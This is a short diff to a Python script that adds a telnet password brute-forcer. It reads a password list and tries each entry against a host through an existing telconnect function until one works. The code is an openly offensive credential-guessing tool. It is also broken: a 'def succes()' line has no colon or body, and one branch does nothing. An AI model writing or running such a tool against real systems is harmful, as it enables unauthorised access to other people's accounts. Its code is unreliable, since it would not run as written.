@@ -14,3 +14,20 @@ def telconnect(host, username, password, port=23,code=0):
         code = 1
     tn.close()
     return code
+def succes()
+def bruteforcer(host, passwordlist, username, port=None):
+    check = os.path.isfile(passwordlist)
+    if check:
+        check = os.path.isfile(username)
+        if check:
+            pass
+        else:
+            with open(passwordlist,'r') as passwords:
+                for password in passwords:
+                    code = telconnect(host,username,password)
+                    if code == 0:
+                        succes(username, password)
+                        break
+    else:
+        print("passwordlist is not valid path")
+        exit()
